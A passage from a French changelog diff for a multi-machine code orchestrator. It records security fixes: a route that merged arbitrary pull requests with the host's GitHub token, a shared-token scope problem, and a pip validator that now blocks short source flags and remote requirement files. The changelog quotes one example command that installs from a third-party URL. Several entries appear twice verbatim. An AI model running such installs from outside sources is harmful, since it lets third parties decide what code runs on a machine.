+  rendait `null`, c'est-à-dire « rien n'a bougé » sur une insertion réelle (la
+  retouche aurait été refusée pour « aucun changement » à quelqu'un qui venait
+  d'écrire une ligne). La propriété ajoutée dit ce que la fonction PROMET — ce
+  qu'on rogne aux deux bouts est réellement commun, donc les DEUX fichiers se
+  reconstruisent depuis la zone — et se vérifie sur les 961 paires de suites de
+  longueur ≤ 4 : exhaustif sur les petits cas, donc reproductible, plutôt
+  qu'aléatoire.
+
+- **La ruche fusionnait n'importe quelle pull request du dépôt.**
+  `POST /api/livraison/fusion` disait, dans son propre commentaire, « fusionne
+  une pull request ouverte par la ruche » — et acceptait n'importe quel numéro.
+  Elle fusionnait donc, **avec le jeton GitHub de l'hôte**, la PR qu'un humain
+  était en train de relire, ou celle d'un contributeur extérieur. Le geste est
+  réputé humain, mais le jeton qui l'autorise se recopie sur chaque machine
+  membre (ADR 0007). Le défaut n'était visible dans aucune des deux routes : il
+  tenait à une **troisième chose, que ni l'une ni l'autre ne faisait**. La voie
+  autonome range ses livraisons dans la table `livraisons` ; la voie MANUELLE se
+  contentait d'émettre un événement, si bien que le numéro de PR n'existait
+  nulle part où le retrouver — ni pour rouvrir « où en est ma livraison ? », ni
+  pour vérifier quoi que ce soit à son sujet. Les deux moitiés sont réparées :
+  la livraison manuelle range comme l'autonome, la fusion **ne fusionne que ce
+  que la ruche a ouvert**, et l'état suit la fusion (une livraison fusionnée qui
+  resterait « ouverte » ferait mentir l'écran et rouvrirait la porte à une
+  seconde fusion). Le refus nomme l'alternative : les autres pull requests se
+  fusionnent sur GitHub — c'est votre dépôt, pas le sien.
+
+- **Un compte recevait 401 sur le rapport de son PROPRE projet.** Onze routes de
+  l'espace projet se gardent par le seul jeton de ruche, sans aucune règle par
+  projet, là où Le Rayon, les membres et les partages se gardent par COMPTE. Le
+  tableau de bord ne s'en apercevait pas — il envoie les deux en-têtes — mais
+  toute autre intégration s'y cognait. Six lectures (`merge`, `merge/result`,
+  `conflicts`, `balance`, `essaim`, `abonnement`) acceptent désormais AUSSI un
+  compte ayant affaire au projet. **C'est une ouverture stricte** : aucune porte
+  existante n'est retirée, la CLI et le mode « tableau de bord sans compte »
+  continuent de marcher à l'identique. ⚠ **Cela ne résout pas le fond**, et
+  `docs/adr/0007-portee-du-jeton-de-ruche.md` l'écrit : le README annonce que
+  `HIVE_TOKEN` se recopie sur chaque machine membre, donc toute abeille de
+  l'essaim lit encore le plan de merge et la balance de n'importe quel projet —
+  et peut **déclencher un merge**, ce qui fait exécuter la commande de test du
+  dépôt sur la machine d'un autre membre. Resserrer change le contrat du produit
+  (la CLI n'a que le jeton de ruche) : c'est une décision d'hôte, posée dans
+  l'ADR avec ses trois voies et leurs coûts. Un test **constate** l'état actuel
+  et **échouera** le jour où quelqu'un tranchera — pour que ce soit un geste
+  conscient et non une découverte.
 
 - **L'intégration continue repasse au vert : un test n'y tournait pas.**
   `tests/isolement-couverture.test.ts` énumérait les fichiers avec `globSync`
@@ -640,7 +1154,150 @@ refonte complète de l'interface en **Mission Control**.
   dashboard) remplace la classe FTS5 ; le contexte est joint à l'assignation
   côté serveur, sans réécrire le prompt persisté.
 
+### Added
+
+- **🔑 Les clés de la ruche ont un écran** (panneau dans l'Intendance, routes
+  `GET /api/membres`, `DELETE /api/membres/:nodeId`, `DELETE /api/billets/:id`).
+  Révoquer une clé compromise est l'archétype de la décision d'administration,
+  et elle n'existait qu'en ligne de commande : le tableau de bord montrait le
+  pouls, les anomalies, les castes et les comptes — mais pas « qui a une clé de
+  ma ruche ». **Les deux gestes sont séparés et leurs conséquences écrites**,
+  parce qu'ils n'ont rien d'interchangeable : une CLÉ appartient à une machine
+  et la révoquer la déconnecte tout de suite ; un BILLET ne vaut rien par
+  lui-même — il sert à obtenir une clé, à usage compté — et le révoquer ne
+  déconnecte personne. Confondre les deux, c'est croire avoir exclu quelqu'un en
+  révoquant le billet par lequel il est entré ; un test fait les deux gestes à
+  la suite sur la même ruche pour que cette confusion soit rouge. Les empreintes
+  ne sortent jamais de la liste.
+
+- **🗣 Le Conseil des Éclaireuses a un écran** (panneau dans la carte projet,
+  routes `GET /api/conseils` et `GET /api/conseil/:sessionId`). Le Conseil ne
+  change RIEN : sa sortie **EST une proposition à un humain**, exactement comme
+  la Miellerie propose un merge sans jamais le faire. Il a pourtant vécu sans
+  aucune interface — l'humain devait ouvrir un terminal pour lire ce qu'on avait
+  délibéré pour lui. C'est le cas le plus net de « mécanisme sans écran » du
+  dépôt, plus net que Les Guetteuses, dont la sortie était au moins une alerte.
+  **On montre les propositions ÉCARTÉES, pas seulement la retenue** : trois des
+  quatre pièges que le protocole évite ne se voient que là. Le **signal d'arrêt**
+  motivé — une piste qu'une éclaireuse est allée vérifier et a jugée mauvaise —
+  est l'information la plus chère du conseil, et elle ne vit que dans une
+  perdante. La **diversité des familles** est affichée à côté du nombre de
+  soutiens, parce que dix instances du même modèle qui s'accordent ne font pas
+  dix avis. Et une issue sans recommandation (`vide`, `sans_quorum`, `epuise`,
+  `depart`) se **dit** : « personne n'a rien trouvé » est un résultat, un écran
+  vide ressemblerait à une panne. Enfin, la liste rend l'issue RANGÉE (nulle tant
+  qu'on délibère) alors que le détail RECALCULE ce que le protocole dirait
+  maintenant : le détail annonce donc son verdict **provisoire** tant que le
+  conseil est ouvert, sinon le résumé aurait l'air de contredire son propre
+  détail.
+
+- **🐙 Le connecteur GitHub a un écran** (panneau « Connecter un dépôt GitHub »
+  en tête de la vue Projets). `GET /api/github/repos` et
+  `POST /api/github/import` vivaient depuis le début sans aucune interface :
+  connecter un dépôt se faisait en ligne de commande, alors que c'est le tout
+  PREMIER geste de quelqu'un qui arrive avec du code existant. Le panneau liste
+  les dépôts (plus récents d'abord), marque privé / archivé / langage, signale
+  ceux **déjà connectés** — deux projets sur un même dépôt, c'est deux plans de
+  merge concurrents sur les mêmes fichiers — et connecte en un clic.
+  **L'écran ne demande jamais le jeton GitHub** : il vit dans l'environnement de
+  l'orchestrateur, en mémoire, le temps du processus. Un champ « collez votre
+  jeton » en ferait une valeur qui traverse le navigateur, l'historique et le
+  presse-papiers, pour un gain nul — c'est l'orchestrateur qui appelle GitHub,
+  pas le navigateur. Quand le jeton manque, le 501 du serveur porte déjà la
+  marche à suivre : on l'affiche telle quelle plutôt que d'en inventer une qui
+  dériverait. **Et le dépôt connecté appartient désormais à qui l'a connecté** :
+  l'import s'authentifiant par le jeton de ruche, il rangeait le projet
+  orphelin, donc inutilisable par son importateur jusqu'à ce qu'un
+  administrateur l'adopte. La voie CLI reste orpheline — elle n'a que le jeton
+  de ruche — et c'est le cas que l'adoption rattrape.
+
+### Tests
+
+- **La boucle complète d'une caste, du travail réel au cadre injecté**
+  (`tests/caste-boucle.test.ts`). Le module pur était éprouvé (à antécédents
+  donnés, quelle caste) et le câblage aussi (à caste donnée, quel cadre) — mais
+  les deux **semaient les inspections à la main**. Le maillon qu'aucun ne
+  parcourait était celui du milieu : un nœud rend une production → les
+  Gardiennes l'inspectent à la RÉCEPTION → l'inspection se range → le corpus
+  borné la relit → la caste change → la tâche SUIVANTE reçoit un autre cadre.
+  Cinq maillons, chacun testé, et rien ne vérifiait qu'ils étaient attachés. Le
+  test fait le trajet sur un vrai nœud WebSocket, sans rien semer. Il verrouille
+  surtout **« pas de cliquet »** — une caste se perd exactement comme elle se
+  gagne (doctrine, règle 3) — sur le CORPUS RÉEL, borné et relu à l'envers, là
+  où un cliquet se cacherait sans qu'on le voie ; la règle n'était vérifiée que
+  sur des antécédents fabriqués. Au passage, le test a d'abord accusé les
+  Gardiennes de ne pas mordre sur un diff vide : c'était **le test qui avait
+  tort**, les Gardiennes ne crient au diff vide que si un diff POUVAIT exister
+  (dépôt connecté, promesse nommée, zéro octet rendu) — c'est écrit dans le
+  fichier pour que la prochaine lecture ne refasse pas l'erreur.
+
 ### Fixed
+
+- **La préparation laissait déplacer la source par la forme COURTE d'un drapeau,
+  et par la valeur d'un autre.** Deux trous dans une règle que le module énonce
+  pourtant clairement (« refusés même quand la sous-commande est bonne »).
+  D'abord `--find-links` était banni pendant que **`-f`, le même drapeau**,
+  figurait parmi les drapeaux à valeur et passait tranquillement : interdire un
+  nom en laissant son synonyme ouvert ne ferme rien. Ensuite
+  `pip install -r http://ailleurs/requirements.txt` était accepté — la LETTRE de
+  la règle est respectée (c'est un fichier qui nomme les paquets, pas la
+  commande) et son esprit trahi exactement comme avec `--index-url` : c'est un
+  tiers qui décide de ce qui s'installe. La même porte, ailleurs. Les formes
+  courtes `-i` et `-f` rejoignent les drapeaux de source, et la valeur d'un
+  `-r`/`--requirement`/`-c` doit désigner un fichier DU DÉPÔT — un chemin local,
+  y compris en sous-dossier, passe toujours.
+
+### Tests
+
+- **La propriété qui rend les exemples de `zoneModifiee` justes**
+  (`tests/retouche.test.ts`). Les dix-huit tests de ce module testaient par
+  l'EXEMPLE — telle entrée, tel triplet — et **un bug réel les traversait tous** :
+  en retirant la borne qui empêche le préfixe et le suffixe communs de se
+  chevaucher, tout restait vert alors que `zoneModifiee(['a'], ['a','a'])`
+  rendait `null`, c'est-à-dire « rien n'a bougé » sur une insertion réelle (la
+  retouche aurait été refusée pour « aucun changement » à quelqu'un qui venait
+  d'écrire une ligne). La propriété ajoutée dit ce que la fonction PROMET — ce
+  qu'on rogne aux deux bouts est réellement commun, donc les DEUX fichiers se
+  reconstruisent depuis la zone — et se vérifie sur les 961 paires de suites de
+  longueur ≤ 4 : exhaustif sur les petits cas, donc reproductible, plutôt
+  qu'aléatoire.
+
+- **La ruche fusionnait n'importe quelle pull request du dépôt.**
+  `POST /api/livraison/fusion` disait, dans son propre commentaire, « fusionne
+  une pull request ouverte par la ruche » — et acceptait n'importe quel numéro.
+  Elle fusionnait donc, **avec le jeton GitHub de l'hôte**, la PR qu'un humain
+  était en train de relire, ou celle d'un contributeur extérieur. Le geste est
+  réputé humain, mais le jeton qui l'autorise se recopie sur chaque machine
+  membre (ADR 0007). Le défaut n'était visible dans aucune des deux routes : il
+  tenait à une **troisième chose, que ni l'une ni l'autre ne faisait**. La voie
+  autonome range ses livraisons dans la table `livraisons` ; la voie MANUELLE se
+  contentait d'émettre un événement, si bien que le numéro de PR n'existait
+  nulle part où le retrouver — ni pour rouvrir « où en est ma livraison ? », ni
+  pour vérifier quoi que ce soit à son sujet. Les deux moitiés sont réparées :
+  la livraison manuelle range comme l'autonome, la fusion **ne fusionne que ce
+  que la ruche a ouvert**, et l'état suit la fusion (une livraison fusionnée qui
+  resterait « ouverte » ferait mentir l'écran et rouvrirait la porte à une
+  seconde fusion). Le refus nomme l'alternative : les autres pull requests se
+  fusionnent sur GitHub — c'est votre dépôt, pas le sien.
+
+- **Un compte recevait 401 sur le rapport de son PROPRE projet.** Onze routes de
+  l'espace projet se gardent par le seul jeton de ruche, sans aucune règle par
+  projet, là où Le Rayon, les membres et les partages se gardent par COMPTE. Le
+  tableau de bord ne s'en apercevait pas — il envoie les deux en-têtes — mais
+  toute autre intégration s'y cognait. Six lectures (`merge`, `merge/result`,
+  `conflicts`, `balance`, `essaim`, `abonnement`) acceptent désormais AUSSI un
+  compte ayant affaire au projet. **C'est une ouverture stricte** : aucune porte
+  existante n'est retirée, la CLI et le mode « tableau de bord sans compte »
+  continuent de marcher à l'identique. ⚠ **Cela ne résout pas le fond**, et
+  `docs/adr/0007-portee-du-jeton-de-ruche.md` l'écrit : le README annonce que
+  `HIVE_TOKEN` se recopie sur chaque machine membre, donc toute abeille de
+  l'essaim lit encore le plan de merge et la balance de n'importe quel projet —
+  et peut **déclencher un merge**, ce qui fait exécuter la commande de test du
+  dépôt sur la machine d'un autre membre. Resserrer change le contrat du produit
+  (la CLI n'a que le jeton de ruche) : c'est une décision d'hôte, posée dans
+  l'ADR avec ses trois voies et leurs coûts. Un test **constate** l'état actuel
+  et **échouera** le jour où quelqu'un tranchera — pour que ce soit un geste
+  conscient et non une découverte.
 
 - Compilation TypeScript stricte (`tsc --noEmit` propre), ESLint + Prettier
   zéro erreur, 253 tests vitest verts.
